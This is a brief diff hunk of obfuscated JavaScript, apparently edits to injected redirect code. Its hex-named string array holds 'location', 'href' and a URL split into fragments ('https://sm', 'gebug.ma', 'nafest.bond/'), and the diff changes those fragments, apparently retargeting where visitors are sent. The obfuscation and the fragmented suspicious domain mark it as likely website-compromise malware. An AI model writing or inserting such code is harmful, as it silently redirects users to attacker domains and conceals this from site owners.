@@ -20,7 +20,7 @@ function _0x21d3() {
     var _0x3208b6 = [
         '6FeDHEL',
         '3057026QQnNhe',
-        'afest.bond/',
+        'nafest.bond/',
         'location',
         'XnjoV',
         '974204wFJoaK',
@@ -28,7 +28,7 @@ function _0x21d3() {
         'https://sm',
         'href',
         '23085hpFbMH',
-        'gebug.manaa',
+        'gebug.ma',
         'fest.bond/',
         '3261078vwiBpj',
         '3625026HkqNaZ',
